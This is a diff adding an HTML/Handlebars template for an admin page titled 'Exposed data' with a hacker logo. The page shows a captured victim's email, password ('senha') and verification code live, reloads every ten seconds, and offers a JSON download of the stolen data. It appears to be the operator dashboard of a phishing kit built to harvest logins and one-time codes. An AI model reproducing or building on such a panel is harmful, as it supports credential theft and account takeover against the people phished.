@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet"  href="/styles/exposed.css">
+    <title>admin</title>
+</head>
+<body>
+    <main>
+        <div class="conteinerAdmin">
+            <div class="H1Adm">
+                <h1>Exposed data</h1>
+                <img src="/logos/./hacker.png">
+            </div>
+            <div class="dataDiv">
+                <div  class="names" class="email">
+                    <p>EMAIL : </p>
+                    <p class="esp_1">
+                        {{#if DadosUser.email}}
+                            {{DadosUser.email}}
+                        {{else}}
+                            esperando dados ...
+                        {{/if}}
+                    </p>
+                </div>
+                <div class="names"  class="senha">
+                    <p>SENHA : </p>
+                    <p class="esp_2">
+                        {{#if DadosUser.senha}}
+                            {{DadosUser.senha}}
+                        {{else}}
+                            esperando dados ...
+                        {{/if}}
+                    </p>
+                </div>
+                <div class="names"  class="codigoVerification">
+                    <p>CODIGO_VERIFY : </p>
+                    <p class="esp_3">
+                        {{#if DadosUser.coding}}
+                            {{DadosUser.coding}}
+                        {{else}}
+                            esperando dados ...
+                        {{/if}}
+                    </p>
+                </div>
+                <div class="names"  class="date">
+                    <button class="btn"><a href="/home/administrator/exposedData/dawnload">arquivo_json</a></button>
+                </div>
+            </div>
+        </div>
+    </main>
+    <script>
+
+
+        setInterval(()=>{
+            location.reload();
+        },10000)
+
+
+    </script>
+</body>
+</html>
